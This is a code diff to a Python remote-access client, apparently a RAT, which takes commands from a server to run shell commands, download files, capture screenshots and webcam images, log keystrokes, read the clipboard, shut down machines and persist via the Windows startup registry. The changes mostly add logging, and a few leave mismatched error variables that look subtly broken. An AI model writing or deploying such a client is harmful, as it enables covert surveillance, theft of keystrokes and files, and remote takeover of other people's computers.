@@ -44,9 +44,10 @@ if platform.system() == 'Windows':
 
 try:
     from pynput.keyboard import Listener
-    _PYNPUT = True
 except ImportError:
     _PYNPUT = False
+else:
+    _PYNPUT = True
 
 logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
 logging.info('Client Started.')
@@ -57,15 +58,15 @@ def reverse_readline(filename: str, buf_size: int = 16384) -> str:
 
     # Credit: https://stackoverflow.com/a/23646049/10625567
 
-    with open(filename) as _file:
+    with open(filename) as file:
         segment = None
         offset = 0
-        _file.seek(0, os.SEEK_END)
-        file_size = remaining_size = _file.tell()
+        file.seek(0, os.SEEK_END)
+        file_size = remaining_size = file.tell()
         while remaining_size > 0:
             offset = min(file_size, offset + buf_size)
-            _file.seek(file_size - offset)
-            buffer = _file.read(min(remaining_size, buf_size))
+            file.seek(file_size - offset)
+            buffer = file.read(min(remaining_size, buf_size))
             remaining_size -= buf_size
             lines = buffer.split('\n')
             if segment is not None:
@@ -114,8 +115,9 @@ def add_startup() -> list:
         SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
         CloseKey(key)
     except Exception as error:
+        logging.error('Error adding client to startup: %s' % errors(error))
         return errors(error)
-    logging.info('Added Client to Startup')
+    logging.info('Adding client to startup successful')
 
 
 def remove_startup() -> list:
@@ -133,16 +135,20 @@ def remove_startup() -> list:
         # Still returns True, since it's not in startup
         pass
     except WindowsError as error:
+        logging.error('Error removing client from startup: %s' % errors(error))
         return errors(error)
     logging.info('Removed Client from Startup')
 
 
 def kill(pid: int) -> None:
-    """ Kill Process by ID """
+    """ Kill Process by PID """
+    logging.info('Killing process with the pid %s and all its children' % str(pid))
     process = psutil.Process(pid)
     for proc in process.children(recursive=True):
         proc.kill()
+        logging.debug('killed child with pid %s' % str(proc.pid))
     process.kill()
+    logging.debug('killed parent with pid %s' % str(pid))
 
 
 def onkeyboardevent(event):
@@ -184,6 +190,7 @@ class Client(object):
         except Exception as error:
             logging.error(errors(error))
             raise
+        logging.info('Connected to server %s:%s' % (self.serverhost, str(self.serverport)))
         try:
             self.socket.send(socket.gethostname().encode())
         except socket.error as error:
@@ -305,10 +312,12 @@ class Client(object):
 
             if data[0] == 'RESTART_SESSION':
                 self.send_json(True)
+                logging.info('Restarting session')
                 break
 
             if data[0] == 'CLOSE':
                 self.send_json(True)
+                logging.info('Closing connection and exiting')
                 self.socket.close()
                 sys.exit(0)
 
@@ -324,6 +333,7 @@ class Client(object):
                 if platform.system() == 'Windows':
                     self.send_json(True)
                     ctypes.windll.user32.LockWorkStation()
+                    logging.info('Locked workstation')
                 else:
                     self.send_json(False)
                 continue
@@ -333,6 +343,7 @@ class Client(object):
                     self.send_json(False)
                     continue
                 self.send_json(True)
+                logging.info('Shutting down system')
                 subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
@@ -342,6 +353,7 @@ class Client(object):
                     self.send_json(False)
                     continue
                 self.send_json(True)
+                logging.info('Restarting system')
                 subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
                 break
@@ -355,13 +367,14 @@ class Client(object):
                 continue
 
             if data[0] == 'ZIP_FILE':
-                logging.info('Zipping File: %s', data[2])
                 try:
                     with ZipFile(data[1], 'w') as ziph:
                         ziph.write(data[2])
                 except Exception as err:
+                    logging.error('Error zipping file %s into %s: %s' % (data[2], data[1], errors(error)))
                     self.send_json(errors(err))
                     continue
+                logging.info('Zipped file %s into %s' % (data[2], data[1]))
                 self.send_json(None)
                 continue
 
@@ -369,32 +382,36 @@ class Client(object):
                 logging.info('Zipping Folder: %s', data[2])
                 try:
                     shutil.make_archive(data[1], 'zip', data[2])
-                except Exception as err:
-                    self.send_json(errors(err))
+                except Exception as error:
+                    logging.error('Error zipping directory %s into %s.zip: %s' % (data[2], data[1], errors(error)))
+                    self.send_json(errors(error))
                     continue
+                logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
                 self.send_json(None)
                 continue
 
             if data[0] == 'UNZIP':
-                logging.info('Unzipping: %s', data[1])
                 try:
                     with ZipFile(data[1], 'r') as ziph:
                         ziph.extractall()
-                except Exception as err:
-                    self.send_json(errors(err))
+                except Exception as error:
+                    logging.error('Failed unzipping %s: %s' % (data[1], errors(error)))
+                    self.send_json(errors(error))
                     continue
+                logging.info('Unzipped %s' % data[1])
                 self.send_json(None)
                 continue
 
             if data[0] == 'DOWNLOAD':
-                logging.info('Downloading "%s" from %s', data[2], data[1])
                 try:
                     request = requests.get(data[1])
                     with open(data[2], 'wb') as file:
                         file.write(request.content)
-                except Exception as err:
-                    self.send_json(errors(err, line=False))
+                except Exception as error:
+                    logging.error('Error downloading "%s" from %s: %s' % (data[2], data[1], errors(error)))
+                    self.send_json(errors(error, line=False))
                     continue
+                logging.info('Downloaded "%s" from %s', data[2], data[1])
                 self.send_json(None)
                 continue
 
@@ -412,7 +429,8 @@ class Client(object):
                         img = pyscreeze.screenshot()
                         img.save(output, format='PNG')
                         content = output.getvalue()
-                except Exception as err:
+                except Exception as error:
+                    logging.error('Error taking screenshot: %s' % errors(error))
                     self.send(b'ERROR')
                     self.receive()
                     self.send(errors(err).encode())
@@ -421,21 +439,22 @@ class Client(object):
                 continue
 
             if data[0] == 'WEBCAM':
-                logging.info('Capturing Webcam')
                 camera = cv2.VideoCapture(0)
                 state, img = camera.read()
                 camera.release()
                 if state:
                     is_success, arr = cv2.imencode('.png', img)
                     if is_success:
+                        logging.info('Captured webcam image')
                         self.send(arr.tobytes())
                         continue
-                logging.info('WebcamCaptureError')
+                logging.error('Error capturing webcam')
                 self.send(b'ERROR')
                 continue
 
             if data[0] == 'START_KEYLOGGER':
                 if not _PYNPUT:
+                    logging.error('pynput not found, could not start keylogger')
                     self.send_json(False)
                     continue
                 if not KeyListener.running:
@@ -465,18 +484,22 @@ class Client(object):
             if data[0] == 'COPY':
                 try:
                     pyperclip.copy(data[1])
-                except pyperclip.PyperclipException as err:
-                    self.send_json(errors(err))
+                except pyperclip.PyperclipException as error:
+                    logging.error('Error copying "%s" to clipboard: %s' % (data[1], errors(error)))
+                    self.send_json(errors(error))
                     continue
+                logging.info('Copied "%s" to clipboard' % data[1])
                 self.send_json(None)
                 continue
 
             if data[0] == 'PASTE':
                 try:
                     clipboard = pyperclip.paste()
-                except pyperclip.PyperclipException as err:
-                    self.send_json([False, errors(err)])
+                except pyperclip.PyperclipException as error:
+                    logging.error('Could not paste from clipboard: %s' % errors(error))
+                    self.send_json([False, errors(error)])
                     continue
+                logging.info('Pasted from clipboard')
                 self.send_json([True, clipboard])
                 continue
 
@@ -485,11 +508,10 @@ class Client(object):
                 if split_command in ['cd', 'chdir']:
                     process = subprocess.Popen(data[1] + self._pwd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     error = process.stderr.read().decode()
-                    if error == "":
+                    if error == '':
                         output = process.stdout.read().decode()
-                        newlines = output.count('\n')
                         # Command should only return one line (cwd)
-                        if newlines > 1:
+                        if output.count('\n') > 1:
                             process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                             self.send_json(['ERROR', process.stdout.read().decode()])
                             continue
@@ -500,7 +522,7 @@ class Client(object):
                     continue
 
                 process = subprocess.Popen(data[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                for line in iter(process.stdout.readline, ""):
+                for line in iter(process.stdout.readline, ''):
                     if line == b'':
                         break
                     self.send(line.replace(b'\n', b''))
@@ -517,6 +539,7 @@ def main(key: bytes, retry_timer: int = 10) -> None:
     """ Run Client """
     # RETRY_TIMER: Time to wait before trying to reconnect
     client = Client(key)
+    logging.info('Starting connection loop')
     while True:
         try:
             client.connect()
@@ -526,13 +549,13 @@ def main(key: bytes, retry_timer: int = 10) -> None:
             break
     try:
         client.receive_commands()
-    except Exception as err:
-        logging.critical(errors(err))
+    except Exception as error:
+        logging.critical(errors(error))
 
 
 if __name__ == '__main__':
 
     # Add Client to Startup when Client is run
     # add_startup()
-    while 1:
+    while True:
         main(b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
